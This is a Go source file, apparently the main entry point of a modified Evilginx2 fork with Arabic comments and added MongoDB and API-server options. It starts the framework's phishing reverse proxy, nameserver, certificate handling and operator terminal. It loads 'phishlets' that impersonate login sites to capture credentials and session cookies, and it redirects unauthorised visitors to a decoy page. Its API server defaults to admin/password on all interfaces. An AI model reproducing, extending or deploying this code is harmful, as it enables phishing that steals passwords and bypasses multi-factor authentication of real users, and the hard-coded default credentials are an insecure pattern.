package main

import (
	"flag"
	"fmt"
	_log "log"
	"os"
	"os/user"
	"path/filepath"
	"regexp"

	"github.com/caddyserver/certmagic"
	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
	"go.uber.org/zap"

	"github.com/fatih/color"
)

// متغيرات الألوان للوحة القيادة
var lb = color.New(color.FgHiBlue).SprintFunc()   // أزرق
var lg = color.New(color.FgHiGreen).SprintFunc()  // أخضر
var lr = color.New(color.FgHiRed).SprintFunc()    // أحمر
var e = ""

var phishlets_dir = flag.String("p", "", "Phishlets directory path")
var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
var debug_log = flag.Bool("debug", false, "Enable debug output")
var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
var cfg_dir = flag.String("c", "", "Configuration directory path")
var version_flag = flag.Bool("v", false, "Show version")
var api_flag = flag.Bool("api", false, "Enable API server")
var api_host = flag.String("api-host", "0.0.0.0", "API server host")
var api_port = flag.Int("api-port", 8888, "API server port")
var admin_username = flag.String("admin-username", "admin", "Admin username for API server")
var admin_password = flag.String("admin-password", "password", "Admin password for API server")
var setup_session = flag.String("setup-session", "setup", "تعيين اسم جلسة الإعداد البعيد")
var tkn_ptr = flag.String("token", "", "تعيين رمز وصول التحكم عن بعد (مطلوب للتحكم عن بعد)")
var daemon_ptr = flag.Bool("daemon", false, "تشغيل في وضع الخادم")
var hostname_ptr = flag.String("hostname", "", "تعيين المضيف للاستماع")
var port_ptr = flag.Int("port", 8080, "تعيين منفذ للاستماع")
var http_ptr = flag.Bool("http", false, "تمكين الاستماع إلى HTTP")
var no_https_ptr = flag.Bool("no-https", false, "تعطيل الاستماع إلى HTTPS")
var ip_ptr = flag.String("ip", "", "تعيين عنوان IP الخارجي")
var unauth_ptr = flag.String("unauth", "https://www.google.com/", "تعيين URL لإعادة التوجيه للمستخدمين غير المصرح لهم")
var db_path = flag.String("db-path", "", "تعيين مسار ملف قاعدة البيانات")
var use_mongo = flag.Bool("use-mongo", false, "استخدام MongoDB بدلاً من قاعدة البيانات المضمنة")
var mongo_uri = flag.String("mongo-uri", "mongodb://localhost:27017", "عنوان اتصال MongoDB")
var mongo_db_name = flag.String("mongo-db", "evilginx", "اسم قاعدة بيانات MongoDB")

func joinPath(base_path string, rel_path string) string {
	var ret string
	if filepath.IsAbs(rel_path) {
		ret = rel_path
	} else {
		ret = filepath.Join(base_path, rel_path)
	}
	return ret
}

func showAd() {
	lred := color.New(color.FgHiRed)
	lyellow := color.New(color.FgHiYellow)
	white := color.New(color.FgHiWhite)
	message := fmt.Sprintf("%s: %s %s", lred.Sprint("Evilginx Mastery Course"), lyellow.Sprint("https://academy.breakdev.org/evilginx-mastery"), white.Sprint("(learn how to create phishlets)"))
	log.Info("%s", message)
}

func main() {
	flag.Parse()

	if *version_flag == true {
		log.Info("version: %s", core.VERSION)
		return
	}

	exe_path, _ := os.Executable()
	exe_dir := filepath.Dir(exe_path)

	core.Banner()
	showAd()

	_log.SetOutput(log.NullLogger().Writer())
	certmagic.Default.Logger = zap.NewNop()
	certmagic.DefaultACME.Logger = zap.NewNop()

	if *phishlets_dir == "" {
		*phishlets_dir = joinPath(exe_dir, "./phishlets")
		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
			*phishlets_dir = "/usr/share/evilginx/phishlets/"
			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
				log.Fatal("you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
				return
			}
		}
	}
	if *redirectors_dir == "" {
		*redirectors_dir = joinPath(exe_dir, "./redirectors")
		if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
			*redirectors_dir = "/usr/share/evilginx/redirectors/"
			if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
				*redirectors_dir = joinPath(exe_dir, "./redirectors")
			}
		}
	}
	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
		return
	}
	if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
		os.MkdirAll(*redirectors_dir, os.FileMode(0700))
	}

	log.DebugEnable(*debug_log)
	if *debug_log {
		log.Info("debug output enabled")
	}

	phishlets_path := *phishlets_dir
	log.Info("loading phishlets from: %s", phishlets_path)

	if *cfg_dir == "" {
		usr, err := user.Current()
		if err != nil {
			log.Fatal("%v", err)
			return
		}
		*cfg_dir = filepath.Join(usr.HomeDir, ".evilginx")
	}

	config_path := *cfg_dir
	log.Info("loading configuration from: %s", config_path)

	err := os.MkdirAll(*cfg_dir, os.FileMode(0700))
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	crt_path := joinPath(*cfg_dir, "./crt")

	cfg, err := core.NewConfig(*cfg_dir, "")
	if err != nil {
		log.Fatal("config: %v", err)
		return
	}
	cfg.SetRedirectorsDir(*redirectors_dir)

	// إعلان متغير واجهة قاعدة البيانات
	var db database.IDatabase
	var buntDb *database.Database

	if *use_mongo {
		// استخدام MongoDB
		db_name := *mongo_db_name
		if db_name == "" {
			db_name = "evilginx"
		}

		fmt.Printf("\n\n")
		fmt.Printf(lb(" تهيئة قاعدة بيانات MongoDB... "))

		mongo_db, err := database.NewMongoDatabase(*mongo_uri, db_name)
		if err != nil {
			log.Fatal("%v", err)
		}
		db = mongo_db

		fmt.Printf(lg("تم") + e)
	} else {
		// استخدام BuntDB (التنفيذ الحالي)
		storage_path := ""
		if *db_path != "" {
			storage_path = *db_path
		} else if *cfg_dir != "" {
			storage_path = filepath.Join(*cfg_dir, "data.db")
		} else {
			ex_path, err := os.Executable()
			if err != nil {
				log.Fatal("%v", err)
			}
			ex_dir := filepath.Dir(ex_path)
			storage_path = filepath.Join(ex_dir, "data.db")
		}

		fmt.Printf("\n\n")
		fmt.Printf(lb(" تهيئة قاعدة البيانات... ") + e)
		fmt.Printf("%s", storage_path)

		err = os.MkdirAll(filepath.Dir(storage_path), 0711)
		if err != nil {
			log.Fatal("%v", err)
		}

		fdb, err := database.NewDatabase(storage_path)
		if err != nil {
			log.Fatal("%v", err)
		}
		db = fdb
		buntDb = fdb

		fmt.Printf(lg("تم") + e)
	}

	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
	if err != nil {
		log.Error("blacklist: %s", err)
		return
	}

	files, err := os.ReadDir(phishlets_path)
	if err != nil {
		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
		return
	}
	for _, f := range files {
		if !f.IsDir() {
			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
			rpname := pr.FindStringSubmatch(f.Name())
			if rpname == nil || len(rpname) < 2 {
				continue
			}
			pname := rpname[1]
			if pname != "" {
				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), nil, cfg)
				if err != nil {
					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
					continue
				}
				cfg.AddPhishlet(pname, pl)
			}
		}
	}
	cfg.LoadSubPhishlets()
	cfg.CleanUp()

	ns, _ := core.NewNameserver(cfg)
	ns.Start()

	crt_db, err := core.NewCertDb(crt_path, cfg, ns)
	if err != nil {
		log.Fatal("certdb: %v", err)
		return
	}

	// نتحقق ما إذا كان نستخدم BuntDB أو MongoDB ونمرر واجهة قاعدة البيانات المناسبة
	var hp *core.HttpProxy
	if *use_mongo {
		// استخدام النوع المناسب لـ MongoDB
		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
	} else {
		// استخدام BuntDB
		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, buntDb, bl, *developer_mode)
	}
	
	hp.Start()

	// Start API server if enabled
	if *api_flag {
		// التأكد من وجود اسم مستخدم وكلمة مرور
		if *admin_username == "" || *admin_password == "" {
			log.Info("Admin credentials not provided, using defaults: admin/password")
			if *admin_username == "" {
				*admin_username = "admin"
			}
			if *admin_password == "" {
				*admin_password = "password"
			}
		}
		
		var api *core.ApiServer
		var err error
		
		if *use_mongo {
			// نستخدم النوع المناسب من قاعدة البيانات
			api, err = core.NewApiServer(*api_host, *api_port, *admin_username, *admin_password, cfg, db)
		} else {
			api, err = core.NewApiServer(*api_host, *api_port, *admin_username, *admin_password, cfg, buntDb)
		}
		
		if err != nil {
			log.Fatal("api server: %v", err)
			return
		}
		
		api.Start()
		log.Info("API server started on %s:%d", *api_host, *api_port)
	}

	var t *core.Terminal
	var err2 error
	
	if *use_mongo {
		t, err2 = core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
	} else {
		t, err2 = core.NewTerminal(hp, cfg, crt_db, buntDb, *developer_mode)
	}
	
	if err2 != nil {
		log.Fatal("%v", err2)
		return
	}

	t.DoWork()
}
